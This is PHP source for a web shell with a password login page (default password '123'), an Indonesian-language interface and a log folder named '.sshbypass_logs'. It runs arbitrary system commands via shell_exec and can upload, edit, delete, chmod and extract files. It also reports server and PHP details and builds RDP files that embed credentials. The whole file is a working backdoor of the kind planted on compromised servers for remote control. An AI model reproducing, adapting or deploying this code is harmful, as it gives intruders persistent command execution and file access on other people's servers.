<?php
@set_time_limit(0);
@error_reporting(0);
session_start();

// === PASSWORD MANAGEMENT ===
$PASS_FILE = __DIR__ . '/.passwd';
function getStoredPassword() {
    global $PASS_FILE;
    if (!file_exists($PASS_FILE)) {
        $default = '123';
        file_put_contents($PASS_FILE, password_hash($default, PASSWORD_DEFAULT));
        return $default;
    }
    return file_get_contents($PASS_FILE);
}

function verifyPassword($plain) {
    $hash = getStoredPassword();
    return password_verify($plain, $hash);
}

function updatePassword($plain) {
    global $PASS_FILE;
    return file_put_contents($PASS_FILE, password_hash($plain, PASSWORD_DEFAULT));
}

// Login check
$logged_in = isset($_SESSION['web_shell_logged_in']) && $_SESSION['web_shell_logged_in'] === true;
if (!$logged_in && (!isset($_GET['action']) || $_GET['action'] !== 'do_login')) {
    ?>
    <!doctype html>
    <html lang="en">
    <head>
        <meta charset="utf-8">
        <title>Login - Web Shell</title>
        <meta name="viewport" content="width=device-width, initial-scale=1">
        <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;600;700&display=swap" rel="stylesheet">
        <style>
            :root {
                --bg-primary: #0b0f19;
                --bg-card: #111827;
                --border: #1f2937;
                --text: #e5e7eb;
                --text-muted: #9ca3af;
                --accent: #6366f1;
                --accent2: #8b5cf6;
                --success: #10b981;
                --danger: #ef4444;
                --warning: #f59e0b;
                --radius: 16px;
                --shadow: 0 25px 50px -12px rgba(0,0,0,0.5);
            }
            * { margin:0; padding:0; box-sizing:border-box; }
            body {
                font-family: 'Inter', sans-serif;
                background: linear-gradient(145deg, #0b0f19 0%, #0f172a 100%);
                min-height: 100vh;
                display: flex;
                align-items: center;
                justify-content: center;
                color: var(--text);
                padding: 20px;
            }
            .login-container {
                background: rgba(17, 24, 39, 0.8);
                backdrop-filter: blur(20px);
                -webkit-backdrop-filter: blur(20px);
                border: 1px solid rgba(255,255,255,0.08);
                border-radius: 24px;
                padding: 40px;
                width: 100%;
                max-width: 420px;
                box-shadow: 0 25px 50px -12px rgba(0,0,0,0.6);
                animation: fadeSlideUp 0.5s ease-out;
            }
            @keyframes fadeSlideUp {
                from { opacity: 0; transform: translateY(20px); }
                to { opacity: 1; transform: translateY(0); }
            }
            .login-header { text-align: center; margin-bottom: 32px; }
            .login-header h1 {
                font-size: 32px;
                font-weight: 700;
                background: linear-gradient(135deg, #818cf8, #c084fc);
                -webkit-background-clip: text;
                background-clip: text;
                color: transparent;
                margin-bottom: 8px;
                letter-spacing: -0.5px;
            }
            .login-header p { color: #9ca3af; font-size: 14px; }
            .input-group { margin-bottom: 24px; }
            .input-group label {
                display: block;
                margin-bottom: 8px;
                font-weight: 600;
                font-size: 14px;
                color: #cbd5e1;
            }
            .input-group input {
                width: 100%;
                background: rgba(15, 23, 42, 0.6);
                border: 1px solid #334155;
                border-radius: 14px;
                padding: 14px 16px;
                font-size: 16px;
                color: #f1f5f9;
                transition: all 0.3s ease;
                outline: none;
            }
            .input-group input:focus {
                border-color: #818cf8;
                box-shadow: 0 0 0 3px rgba(99, 102, 241, 0.2);
                background: rgba(15, 23, 42, 0.9);
            }
            .btn-login {
                width: 100%;
                background: linear-gradient(135deg, #6366f1, #8b5cf6);
                border: none;
                border-radius: 14px;
                padding: 14px;
                font-size: 16px;
                font-weight: 700;
                color: white;
                cursor: pointer;
                transition: all 0.3s ease;
                letter-spacing: 0.3px;
                box-shadow: 0 4px 15px rgba(99, 102, 241, 0.3);
            }
            .btn-login:hover {
                transform: translateY(-2px);
                box-shadow: 0 8px 25px rgba(99, 102, 241, 0.5);
            }
            .btn-login:active { transform: translateY(0); }
            .error-msg {
                background: rgba(239, 68, 68, 0.1);
                border-left: 4px solid #ef4444;
                padding: 14px;
                border-radius: 12px;
                margin-bottom: 24px;
                font-size: 14px;
                color: #fca5a5;
                text-align: center;
                animation: shake 0.4s ease;
            }
            @keyframes shake {
                0%,100% { transform: translateX(0); }
                25% { transform: translateX(-5px); }
                75% { transform: translateX(5px); }
            }
        </style>
    </head>
    <body>
        <div class="login-container">
            <div class="login-header">
                <h1>🔐 Web Shell</h1>
                <p>Enter password to continue</p>
            </div>
            <?php if (isset($_GET['error'])): ?>
                <div class="error-msg">❌ Invalid password. Try again.</div>
            <?php endif; ?>
            <form method="POST" action="?action=do_login">
                <div class="input-group">
                    <label>Password</label>
                    <input type="password" name="password" placeholder="Enter password" autofocus required>
                </div>
                <button type="submit" class="btn-login">▶ Login</button>
            </form>
        </div>
    </body>
    </html>
    <?php
    exit;
}

if (isset($_GET['action']) && $_GET['action'] === 'do_login') {
    $pass = $_POST['password'] ?? '';
    if (verifyPassword($pass)) {
        $_SESSION['web_shell_logged_in'] = true;
        header('Location: ?');
        exit;
    } else {
        header('Location: ?action=login&error=1');
        exit;
    }
}

if (isset($_GET['action']) && $_GET['action'] === 'logout') {
    session_destroy();
    header('Location: ?action=login');
    exit;
}

// === FUNCTIONS FOR RDP & INFO ===
function getServerIp() {
    if (!empty($_SERVER['SERVER_ADDR'])) {
        $ip = $_SERVER['SERVER_ADDR'];
        if (filter_var($ip, FILTER_VALIDATE_IP) && $ip != '::1') return $ip;
    }
    $host = $_SERVER['HTTP_HOST'] ?? $_SERVER['SERVER_NAME'] ?? null;
    if ($host && $host != 'localhost') {
        $ip = gethostbyname($host);
        if ($ip && $ip != $host && filter_var($ip, FILTER_VALIDATE_IP)) return $ip;
    }
    $localHost = gethostname();
    if ($localHost) {
        $ip = gethostbyname($localHost);
        if ($ip && $ip != $localHost && filter_var($ip, FILTER_VALIDATE_IP)) return $ip;
    }
    $external = @file_get_contents('https://api.ipify.org');
    if ($external && filter_var(trim($external), FILTER_VALIDATE_IP)) return trim($external);
    return '127.0.0.1';
}

function checkRDP($host, $port = 3389, $timeout = 3) {
    if ($host == '127.0.0.1' || $host == '::1' || $host == 'localhost') {
        return ['status' => 'unknown', 'message' => 'Tidak dapat mengecek pada localhost (RDP mungkin aktif)'];
    }
    $conn = @fsockopen($host, $port, $errno, $errstr, $timeout);
    if ($conn) { fclose($conn); return ['status' => 'open', 'message' => "✅ Port $port terbuka (RDP siap)"]; }
    else return ['status' => 'closed', 'message' => "❌ Port $port tertutup: " . ($errstr ?: 'koneksi gagal')];
}

// ===== CONFIG =====
$LOG_DIR = __DIR__ . '/.sshbypass_logs';
$MAX_LOG_SIZE = 5 * 1024 * 1024;
// ==================

// IP restriction (optional)
$ALLOWED_IPS = [];
if (!empty($ALLOWED_IPS)) {
    $rip = $_SERVER['REMOTE_ADDR'] ?? '';
    if (!in_array($rip, $ALLOWED_IPS, true)) { header('HTTP/1.1 403 Forbidden'); echo "Forbidden\n"; exit; }
}

// Log directory setup
if (!is_dir($LOG_DIR)) {
    @mkdir($LOG_DIR, 0700, true);
    @file_put_contents($LOG_DIR . '/.htaccess', "<IfModule mod_authz_core.c>\nRequire all denied\n</IfModule>\n<IfModule !mod_authz_core.c>\nDeny from all\n</IfModule>");
}

$disabled = ini_get('disable_functions');
$has_shell = true;
if ($disabled) {
    $df = array_map('trim', explode(',', $disabled));
    foreach (['shell_exec','exec','passthru','system','proc_open'] as $f) {
        if (in_array($f, $df)) { $has_shell = false; break; }
    }
}

if (!isset($_SESSION['cwd'])) $_SESSION['cwd'] = __DIR__;
$cwd = $_SESSION['cwd'];
if (!is_dir($cwd)) { $cwd = __DIR__; $_SESSION['cwd'] = $cwd; }

if (!isset($_SESSION['flash'])) $_SESSION['flash'] = '';
$flash = $_SESSION['flash'];
$_SESSION['flash'] = '';

function h($s) { return htmlspecialchars($s, ENT_QUOTES, 'UTF-8'); }
function redirect($url = '?') { header("Location: $url"); exit; }
function flash_set($msg) { $_SESSION['flash'] = $msg; }

$sid = session_id();
$logfile = $LOG_DIR . "/session_{$sid}.log";
function append_log($file, $text) { @file_put_contents($file, $text, FILE_APPEND | LOCK_EX); }

// ==================== ACTION HANDLERS ====================
$action = $_REQUEST['action'] ?? null;
$menu = $_GET['menu'] ?? null;

// Terminal AJAX endpoints
if (in_array($action, ['run','read','clear'])) {
    if ($action === 'run') {
        $cmd = trim($_POST['cmd'] ?? '');
        if ($cmd === '') { header('Content-Type: application/json'); echo json_encode(['ok'=>false,'err'=>'empty command']); exit; }
        $time = date('Y-m-d H:i:s');
        append_log($logfile, "[$time] $ $cmd\n");
        if (preg_match('/^cd\s+(.+)/', $cmd, $m)) {
            $newdir = trim($m[1]);
            if ($newdir[0] !== '/') $newdir = $cwd . '/' . $newdir;
            $newdir = realpath($newdir);
            if ($newdir && is_dir($newdir)) { $_SESSION['cwd'] = $newdir; $out = "Directory changed to: $newdir\n"; }
            else $out = "cd: no such directory: $newdir\n";
            append_log($logfile, $out . "\n");
        } else {
            if (!$has_shell) $out = "[ERROR] shell functions disabled.\n";
            else {
                $fullcmd = 'cd ' . escapeshellarg($cwd) . ' && ' . $cmd . ' 2>&1';
                $out = @shell_exec($fullcmd);
                if ($out === null) $out = "[NOTICE] No output.\n";
            }
            append_log($logfile, $out . "\n");
        }
        if (file_exists($logfile) && filesize($logfile) > $MAX_LOG_SIZE) {
            $data = @file_get_contents($logfile);
            $keep = substr($data, - (int)($MAX_LOG_SIZE / 2));
            @file_put_contents($logfile, $keep, LOCK_EX);
        }
        header('Content-Type: application/json; charset=utf-8');
        echo json_encode(['ok'=>true, 'output_preview'=>substr($out,0,2000)]);
        exit;
    }
    if ($action === 'read') {
        $content = file_exists($logfile) ? @file_get_contents($logfile) : '';
        header('Content-Type: text/plain; charset=utf-8');
        echo $content;
        exit;
    }
    if ($action === 'clear') { if (file_exists($logfile)) @unlink($logfile); echo "CLEARED\n"; exit; }
}

// Upload handler
if ($action === 'upload') {
    if (isset($_FILES['file']) && $_FILES['file']['error'] === UPLOAD_ERR_OK) {
        $tmp_name = $_FILES['file']['tmp_name'];
        $original_name = basename($_FILES['file']['name']);
        $target = $cwd . '/' . $original_name;
        if (move_uploaded_file($tmp_name, $target)) flash_set("File uploaded: " . $original_name);
        else flash_set("Upload failed.");
    } else flash_set("No file or upload error.");
    redirect('?');
}

// File Manager actions
if ($action === 'cd') {
    $path = $_GET['path'] ?? '';
    if ($path === '..') $new = dirname($cwd);
    else { if ($path[0] !== '/') $path = $cwd . '/' . $path; $new = realpath($path); }
    if ($new && is_dir($new)) $_SESSION['cwd'] = $new;
    else flash_set("Invalid directory.");
    redirect('?');
}
if ($action === 'download') {
    $file = $_GET['file'] ?? '';
    $fpath = ($file[0] === '/') ? realpath($file) : realpath($cwd . '/' . $file);
    if ($fpath && is_file($fpath) && strpos($fpath, realpath($cwd)) === 0) {
        header('Content-Description: File Transfer');
        header('Content-Type: application/octet-stream');
        header('Content-Disposition: attachment; filename="'.basename($fpath).'"');
        header('Content-Length: ' . filesize($fpath));
        readfile($fpath);
        exit;
    }
    flash_set("File not found.");
    redirect('?');
}
if ($action === 'delete') {
    $file = $_GET['file'] ?? '';
    $fpath = ($file[0] === '/') ? realpath($file) : realpath($cwd . '/' . $file);
    if ($fpath && file_exists($fpath) && strpos($fpath, realpath($cwd)) === 0) {
        if (is_dir($fpath)) {
            function delTree($dir) { $files = array_diff(scandir($dir), ['.','..']); foreach ($files as $f) { $p = "$dir/$f"; is_dir($p) ? delTree($p) : unlink($p); } return rmdir($dir); }
            flash_set(delTree($fpath) ? "Folder deleted." : "Failed to delete folder.");
        } else flash_set(unlink($fpath) ? "File deleted." : "Failed to delete file.");
    } else flash_set("Invalid path.");
    redirect('?');
}
if ($action === 'rename') {
    $old = $_POST['old'] ?? ''; $new = $_POST['new'] ?? '';
    $oldpath = realpath($cwd . '/' . $old);
    $newpath = dirname($oldpath) . '/' . basename($new);
    if ($oldpath && file_exists($oldpath) && strpos($oldpath, realpath($cwd)) === 0) flash_set(@rename($oldpath, $newpath) ? "Renamed." : "Rename failed.");
    else flash_set("Invalid path.");
    redirect('?');
}
if ($action === 'edit') {
    $file = $_GET['file'] ?? '';
    $fpath = realpath($cwd . '/' . $file);
    if ($fpath && is_file($fpath) && strpos($fpath, realpath($cwd)) === 0) { $editFile = $fpath; $editContent = @file_get_contents($fpath); }
    else { flash_set("File not found."); redirect('?'); }
}
if ($action === 'save') {
    $file = $_POST['file'] ?? ''; $content = $_POST['content'] ?? '';
    $fpath = realpath($file);
    if ($fpath && is_file($fpath) && strpos($fpath, realpath($cwd)) === 0) flash_set(@file_put_contents($fpath, $content) !== false ? "File saved." : "Save failed.");
    else flash_set("Invalid file.");
    redirect('?');
}
if ($action === 'view') {
    $file = $_GET['file'] ?? '';
    $fpath = realpath($cwd . '/' . $file);
    if ($fpath && is_file($fpath) && strpos($fpath, realpath($cwd)) === 0) { $viewContent = @file_get_contents($fpath); $viewFilename = basename($fpath); }
    else { flash_set("File not found."); redirect('?'); }
}
if ($action === 'extract') {
    $file = $_GET['file'] ?? '';
    $fpath = realpath($cwd . '/' . $file);
    if ($fpath && is_file($fpath) && strpos($fpath, realpath($cwd)) === 0) {
        $ext = strtolower(pathinfo($fpath, PATHINFO_EXTENSION));
        $dir = dirname($fpath);
        if ($ext === 'zip' && class_exists('ZipArchive')) {
            $zip = new ZipArchive;
            if ($zip->open($fpath) === TRUE) { $zip->extractTo($dir); $zip->close(); flash_set("ZIP extracted."); }
            else flash_set("Failed to open ZIP.");
        } elseif (in_array($ext, ['tar','gz','bz2']) || preg_match('/\.tar\.(gz|bz2)$/', basename($fpath))) {
            if ($has_shell) { $out = @shell_exec('cd '.escapeshellarg($dir).' && tar -xf '.escapeshellarg($fpath).' 2>&1'); flash_set("TAR extraction executed."); }
            else flash_set("Shell functions disabled.");
        } else flash_set("Unsupported format.");
    } else flash_set("File not found.");
    redirect('?');
}
if ($action === 'chmod') {
    $file = $_POST['file'] ?? ''; $mode = $_POST['mode'] ?? '';
    $fpath = realpath($cwd . '/' . $file);
    if ($fpath && file_exists($fpath) && strpos($fpath, realpath($cwd)) === 0) flash_set(@chmod($fpath, octdec($mode)) ? "Permissions changed." : "Chmod failed.");
    else flash_set("Invalid file.");
    redirect('?');
}
if ($action === 'mkdir') {
    $name = $_POST['dirname'] ?? '';
    if ($name) { $newdir = $cwd . '/' . basename($name); if (!file_exists($newdir)) flash_set(@mkdir($newdir, 0755) ? "Directory created." : "Failed."); else flash_set("Already exists."); }
    redirect('?');
}
// === NEW: CREATE FILE ===
if ($action === 'create_file') {
    $filename = trim($_POST['filename'] ?? '');
    $content = $_POST['filecontent'] ?? '';
    if ($filename) {
        $fullpath = $cwd . '/' . basename($filename);
        if (!file_exists($fullpath)) {
            if (file_put_contents($fullpath, $content) !== false) flash_set("File created: " . basename($filename));
            else flash_set("Failed to create file.");
        } else flash_set("File already exists.");
    } else flash_set("Filename is required.");
    redirect('?');
}
// === CHANGE PASSWORD ===
if ($action === 'change_password') {
    $old = $_POST['old_pass'] ?? '';
    $new = $_POST['new_pass'] ?? '';
    $confirm = $_POST['confirm_pass'] ?? '';
    if (verifyPassword($old)) {
        if ($new === $confirm && strlen($new) > 0) {
            if (updatePassword($new)) flash_set("Password changed successfully.");
            else flash_set("Failed to change password.");
        } else flash_set("New password mismatch or empty.");
    } else flash_set("Old password is incorrect.");
    redirect('?menu=change_pass');
}
// === RDP GENERATOR (handle download) ===
if ($action === 'rdp_download') {
    $content = base64_decode($_POST['rdp_content'] ?? '');
    $label = preg_replace('/[^a-zA-Z0-9_-]/', '_', $_POST['label'] ?? 'rdp');
    if ($content) {
        header('Content-Type: application/rdp');
        header('Content-Disposition: attachment; filename="' . $label . '.rdp"');
        echo $content;
        exit;
    }
    flash_set("Invalid RDP content");
    redirect('?menu=rdp');
}
?>
<!doctype html>
<html lang="en">
<head>
  <meta charset="utf-8" />
  <title>Advanced Web Shell</title>
  <meta name="viewport" content="width=device-width, initial-scale=1" />
  <link href="https://fonts.googleapis.com/css2?family=JetBrains+Mono:wght@400;700&family=Inter:wght@400;500;600;700&display=swap" rel="stylesheet">
  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0-beta3/css/all.min.css">
  <style>
    :root {
      --bg-body: #0a0f1a;
      --bg-card: rgba(15, 23, 42, 0.7);
      --bg-card-solid: #0f172a;
      --border: rgba(255,255,255,0.06);
      --border-light: #1e293b;
      --text: #e2e8f0;
      --text-secondary: #94a3b8;
      --accent: #818cf8;
      --accent2: #a78bfa;
      --green: #10b981;
      --red: #ef4444;
      --orange: #f59e0b;
      --radius: 16px;
      --radius-sm: 10px;
      --transition: 0.25s cubic-bezier(0.4, 0, 0.2, 1);
      --glass-bg: rgba(15, 23, 42, 0.6);
      --glass-border: rgba(255,255,255,0.08);
    }
    * { margin:0; padding:0; box-sizing:border-box; }
    body {
      font-family: 'Inter', sans-serif;
      background: var(--bg-body);
      background-image: radial-gradient(ellipse at 30% 0%, #1e1b4b 0%, transparent 60%),
                        radial-gradient(ellipse at 70% 100%, #0f172a 0%, transparent 50%);
      color: var(--text);
      padding-top: 80px;
      padding-bottom: 40px;
      padding-left: 24px;
      padding-right: 24px;
      min-height: 100vh;
      line-height: 1.5;
      -webkit-font-smoothing: antialiased;
    }
    /* Scrollbar */
    ::-webkit-scrollbar { width: 6px; height: 6px; }
    ::-webkit-scrollbar-track { background: transparent; }
    ::-webkit-scrollbar-thumb { background: #334155; border-radius: 3px; }
    ::-webkit-scrollbar-thumb:hover { background: #475569; }

    /* Navbar Glass */
    .navbar {
      position: fixed;
      top: 16px;
      left: 50%;
      transform: translateX(-50%);
      width: calc(100% - 40px);
      max-width: 1400px;
      background: rgba(15, 23, 42, 0.75);
      backdrop-filter: blur(16px);
      -webkit-backdrop-filter: blur(16px);
      border: 1px solid rgba(255,255,255,0.06);
      border-radius: 20px;
      padding: 12px 24px;
      display: flex;
      align-items: center;
      justify-content: space-between;
      z-index: 1000;
      box-shadow: 0 8px 32px rgba(0,0,0,0.4);
      transition: all 0.3s ease;
    }
    .nav-left, .nav-right { display: flex; align-items: center; gap: 16px; }
    .hamburger {
      font-size: 24px;
      cursor: pointer;
      background: rgba(255,255,255,0.05);
      border: 1px solid rgba(255,255,255,0.08);
      color: #94a3b8;
      padding: 8px 12px;
      border-radius: 12px;
      transition: all 0.2s ease;
    }
    .hamburger:hover { background: rgba(99,102,241,0.15); color: #a5b4fc; border-color: rgba(99,102,241,0.3); }
    .navbar .brand { font-weight: 600; color: #cbd5e1; letter-spacing: -0.3px; }
    .navbar .brand i { color: var(--accent); }

    /* Dropdown menu */
    .menu-dropdown {
      position: fixed;
      top: 90px;
      left: 50%;
      transform: translateX(-50%);
      width: calc(100% - 40px);
      max-width: 350px;
      background: rgba(15, 23, 42, 0.9);
      backdrop-filter: blur(24px);
      -webkit-backdrop-filter: blur(24px);
      border: 1px solid rgba(255,255,255,0.08);
      border-radius: 20px;
      padding: 8px;
      display: none;
      flex-direction: column;
      z-index: 999;
      box-shadow: 0 20px 50px rgba(0,0,0,0.6);
      animation: dropdownIn 0.2s ease;
    }
    @keyframes dropdownIn { from { opacity: 0; transform: translateX(-50%) translateY(-10px); } to { opacity: 1; transform: translateX(-50%) translateY(0); } }
    .menu-dropdown.show { display: flex; }
    .menu-dropdown a {
      padding: 12px 16px;
      color: #cbd5e1;
      text-decoration: none;
      font-weight: 500;
      border-radius: 12px;
      transition: all 0.2s ease;
      display: flex;
      align-items: center;
      gap: 12px;
      font-size: 15px;
    }
    .menu-dropdown a i { width: 20px; text-align: center; color: var(--accent); }
    .menu-dropdown a:hover { background: rgba(99,102,241,0.1); color: #fff; }

    /* Container */
    .container {
      max-width: 1400px;
      margin: 0 auto;
      display: flex;
      flex-direction: column;
      gap: 20px;
    }

    /* Card */
    .card {
      background: var(--bg-card);
      backdrop-filter: blur(12px);
      -webkit-backdrop-filter: blur(12px);
      border: 1px solid var(--border);
      border-radius: var(--radius);
      padding: 24px;
      box-shadow: 0 4px 24px rgba(0,0,0,0.3);
      transition: box-shadow 0.3s ease;
    }
    .card:hover { box-shadow: 0 8px 40px rgba(0,0,0,0.5); }

    .card-header {
      display: flex;
      align-items: center;
      justify-content: space-between;
      margin-bottom: 20px;
      padding-bottom: 12px;
      border-bottom: 1px solid rgba(255,255,255,0.05);
    }
    .card-header h2 {
      font-size: 1.25rem;
      font-weight: 600;
      background: linear-gradient(135deg, #c7d2fe, #a5b4fc);
      -webkit-background-clip: text;
      background-clip: text;
      color: transparent;
      display: flex;
      align-items: center;
      gap: 8px;
    }

    /* Terminal */
    .terminal {
      background: #020617;
      padding: 16px;
      border-radius: var(--radius-sm);
      font-family: 'JetBrains Mono', monospace;
      font-size: 0.8rem;
      height: 35vh;
      overflow-y: auto;
      white-space: pre-wrap;
      border: 1px solid #1e293b;
      margin-bottom: 12px;
      color: #a7f3d0;
      box-shadow: inset 0 2px 8px rgba(0,0,0,0.5);
      line-height: 1.6;
    }
    .input-group { display: flex; gap: 10px; }
    .input-group input {
      flex: 1;
      background: rgba(15, 23, 42, 0.8);
      border: 1px solid #334155;
      color: #f1f5f9;
      padding: 10px 16px;
      border-radius: var(--radius-sm);
      font-family: 'JetBrains Mono', monospace;
      transition: all 0.2s ease;
    }
    .input-group input:focus { outline: none; border-color: var(--accent); box-shadow: 0 0 0 2px rgba(99,102,241,0.2); }

    /* Buttons */
    .btn {
      padding: 10px 18px;
      border: none;
      border-radius: var(--radius-sm);
      font-weight: 600;
      cursor: pointer;
      transition: all 0.2s ease;
      font-family: 'Inter', sans-serif;
      font-size: 14px;
      display: inline-flex;
      align-items: center;
      justify-content: center;
      gap: 6px;
      letter-spacing: 0.2px;
    }
    .btn:hover { filter: brightness(1.1); transform: translateY(-1px); }
    .btn:active { transform: translateY(0); }
    .btn-green { background: linear-gradient(135deg, #059669, #10b981); color: white; box-shadow: 0 2px 10px rgba(16,185,129,0.3); }
    .btn-red { background: linear-gradient(135deg, #b91c1c, #ef4444); color: white; box-shadow: 0 2px 10px rgba(239,68,68,0.3); }
    .btn-gray { background: rgba(30, 41, 59, 0.7); color: #cbd5e1; border: 1px solid #334155; }
    .btn-gray:hover { background: rgba(51, 65, 85, 0.8); }
    .btn-sm { padding: 6px 14px; font-size: 13px; }

    /* Toolbar */
    .toolbar { display: flex; gap: 12px; flex-wrap: wrap; margin-bottom: 20px; align-items: center; }
    .toolbar form { display: inline-flex; gap: 6px; align-items: center; }
    .toolbar input[type="text"], .toolbar input[type="file"] {
      background: rgba(15,23,42,0.8); border: 1px solid #334155; color: #e2e8f0;
      padding: 7px 12px; border-radius: 8px; font-size: 13px;
    }

    /* Table */
    table { width: 100%; border-collapse: collapse; }
    th {
      background: rgba(15,23,42,0.6);
      color: #94a3b8;
      text-align: left;
      padding: 12px 16px;
      font-size: 0.75rem;
      font-weight: 600;
      text-transform: uppercase;
      letter-spacing: 0.5px;
      border-bottom: 1px solid #1e293b;
    }
    td {
      padding: 12px 16px;
      border-bottom: 1px solid rgba(255,255,255,0.03);
      transition: background 0.2s;
    }
    tr:hover td { background: rgba(99,102,241,0.03); }
    .dir-row { color: #818cf8; font-weight: 500; }
    .file-row { color: #e2e8f0; }
    .action-cell a {
      text-decoration: none;
      font-size: 0.7rem;
      font-weight: 500;
      padding: 4px 10px;
      border-radius: 20px;
      background: rgba(255,255,255,0.03);
      color: #94a3b8;
      margin-right: 4px;
      transition: all 0.2s;
    }
    .action-cell a:hover { background: rgba(99,102,241,0.15); color: #a5b4fc; }

    /* Flash */
    .flash {
      background: rgba(16,185,129,0.08);
      border-left: 4px solid var(--green);
      padding: 14px 20px;
      border-radius: 12px;
      margin-bottom: 16px;
      font-weight: 500;
      color: #6ee7b7;
      animation: slideDown 0.3s ease;
    }
    @keyframes slideDown { from { opacity:0; transform: translateY(-10px); } to { opacity:1; transform: translateY(0); } }

    /* Info grid */
    .info-grid { display: grid; grid-template-columns: repeat(auto-fill, minmax(280px,1fr)); gap: 16px; }
    .info-card {
      background: rgba(15,23,42,0.5);
      padding: 18px;
      border-radius: 14px;
      border: 1px solid rgba(255,255,255,0.05);
      transition: border 0.2s;
    }
    .info-card:hover { border-color: rgba(99,102,241,0.2); }
    .info-card h3 { margin-bottom: 12px; color: #a5b4fc; font-size: 15px; }
    .badge {
      display: inline-block;
      padding: 3px 10px;
      border-radius: 20px;
      font-size: 0.7rem;
      font-weight: 600;
      letter-spacing: 0.3px;
    }
    .badge-success { background: rgba(16,185,129,0.15); color: #34d399; }
    .badge-danger { background: rgba(239,68,68,0.15); color: #f87171; }
    .badge-warning { background: rgba(245,158,11,0.15); color: #fbbf24; }

    /* Forms */
    .form-group { margin-bottom: 18px; }
    .form-group label { display: block; margin-bottom: 6px; font-weight: 500; font-size: 14px; color: #cbd5e1; }
    .form-group input, .form-group textarea {
      width: 100%;
      background: rgba(15,23,42,0.8);
      border: 1px solid #334155;
      border-radius: var(--radius-sm);
      padding: 10px 14px;
      color: #f1f5f9;
      font-family: inherit;
      transition: border 0.2s, box-shadow 0.2s;
    }
    .form-group input:focus, .form-group textarea:focus { border-color: var(--accent); box-shadow: 0 0 0 2px rgba(99,102,241,0.2); outline: none; }

    hr { border: none; border-top: 1px solid rgba(255,255,255,0.06); margin: 20px 0; }
    pre {
      background: #020617;
      padding: 14px;
      border-radius: 12px;
      overflow: auto;
      border: 1px solid #1e293b;
    }

    @media (max-width: 768px) {
      body { padding: 90px 12px 30px; }
      .navbar { padding: 10px 16px; }
      .toolbar { flex-direction: column; align-items: flex-start; }
    }
  </style>
</head>
<body>
<div class="navbar">
  <div class="nav-left">
    <button class="hamburger" id="hamburgerBtn"><i class="fas fa-bars"></i></button>
    <span class="brand"><i class="fas fa-terminal"></i> Web Shell</span>
  </div>
  <div class="nav-right">
    <a href="?action=logout" class="btn btn-gray btn-sm"><i class="fas fa-sign-out-alt"></i> Logout</a>
  </div>
</div>
<div class="menu-dropdown" id="menuDropdown">
  <a href="?menu=rdp"><i class="fas fa-desktop"></i> Buat RDP</a>
  <a href="?menu=info"><i class="fas fa-info-circle"></i> Info Sistem</a>
  <a href="?menu=change_pass"><i class="fas fa-key"></i> Ganti Sandi</a>
</div>

<div class="container">
  <?php if ($flash): ?><div class="flash"><?= h($flash) ?></div><?php endif; ?>

  <!-- MENU CONTENT -->
  <?php if ($menu === 'rdp'): 
        $server_ip = getServerIp();
        $rdp_check = checkRDP($server_ip);
        $rdp_result = null;
        if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['generate_rdp'])) {
            $username = $_POST['username'] ?? '';
            $password = $_POST['password'] ?? '';
            $domain = $_POST['domain'] ?? '';
            $label = preg_replace('/[^a-zA-Z0-9_-]/', '_', $_POST['label'] ?? 'rdp_'.str_replace('.','_',$server_ip));
            if ($username) {
                $content = "full address:s:$server_ip\n";
                $content .= "username:s:$username\n";
                if ($domain) $content .= "domain:s:$domain\n";
                if ($password) $content .= "password 51:b:" . base64_encode($password) . "\n";
                $content .= "screen mode id:i:2\ndesktopwidth:i:1366\ndesktopheight:i:768\nsession bpp:i:32\nautoreconnection enabled:i:1\n";
                $rdp_result = ['content' => $content, 'label' => $label, 'server' => $server_ip, 'username' => $username, 'password' => $password ?: '(kosong)', 'domain' => $domain ?: '-'];
            } else { flash_set("Username wajib diisi"); }
        }
  ?>
    <div class="card">
      <div class="card-header"><h2><i class="fas fa-desktop"></i> Buat File RDP</h2></div>
      <p style="margin-bottom:16px;">IP Server: <strong style="color:#a5b4fc;"><?= h($server_ip) ?></strong> &nbsp;|&nbsp; Status RDP: <?= $rdp_check['message'] ?></p>
      <form method="POST">
        <div class="form-group"><label>Username</label><input type="text" name="username" required placeholder="Administrator"></div>
        <div class="form-group"><label>Password (opsional)</label><input type="password" name="password" placeholder="Kosongkan jika tidak ingin disimpan"></div>
        <div class="form-group"><label>Domain</label><input type="text" name="domain" placeholder="Domain (opsional)"></div>
        <div class="form-group"><label>Nama File</label><input type="text" name="label" value="rdp_<?= str_replace('.','_',$server_ip) ?>"></div>
        <button type="submit" name="generate_rdp" class="btn btn-green"><i class="fas fa-cog"></i> Generate RDP</button>
      </form>
      <?php if ($rdp_result): ?>
        <hr>
        <div class="info-card" style="margin-bottom:16px;">
          <h3>📋 Detail Koneksi</h3>
          <p>Server: <?= h($rdp_result['server']) ?></p>
          <p>Username: <?= h($rdp_result['username']) ?></p>
          <p>Password: <?= h($rdp_result['password']) ?></p>
          <p>Domain: <?= h($rdp_result['domain']) ?></p>
        </div>
        <pre><?= h($rdp_result['content']) ?></pre>
        <form method="POST" action="?action=rdp_download" style="margin-top:12px;">
          <input type="hidden" name="rdp_content" value="<?= base64_encode($rdp_result['content']) ?>">
          <input type="hidden" name="label" value="<?= h($rdp_result['label']) ?>">
          <button type="submit" class="btn btn-green"><i class="fas fa-download"></i> Download .rdp</button>
        </form>
      <?php endif; ?>
    </div>
  <?php elseif ($menu === 'info'): 
        $server_ip = getServerIp();
        $rdp_check = checkRDP($server_ip);
        $php_version = phpversion();
        $os = php_uname();
        $disabled_func = ini_get('disable_functions');
        $has_zip = class_exists('ZipArchive');
        $has_shell_exec = function_exists('shell_exec') && !in_array('shell_exec', explode(',', $disabled_func));
        $has_exec = function_exists('exec') && !in_array('exec', explode(',', $disabled_func));
        $extensions = get_loaded_extensions();
        sort($extensions);
  ?>
    <div class="card">
      <div class="card-header"><h2><i class="fas fa-info-circle"></i> Informasi Sistem</h2></div>
      <div class="info-grid">
        <div class="info-card"><h3>🌐 Server</h3><p>IP: <?= h($server_ip) ?></p><p>OS: <?= h($os) ?></p><p>PHP: <?= $php_version ?></p></div>
        <div class="info-card"><h3>🖥 RDP</h3><p><?= $rdp_check['message'] ?></p><?php if($rdp_check['status']=='open'): ?><span class="badge badge-success">SUPPORT</span><?php else: ?><span class="badge badge-danger">TIDAK SUPPORT</span><?php endif; ?></div>
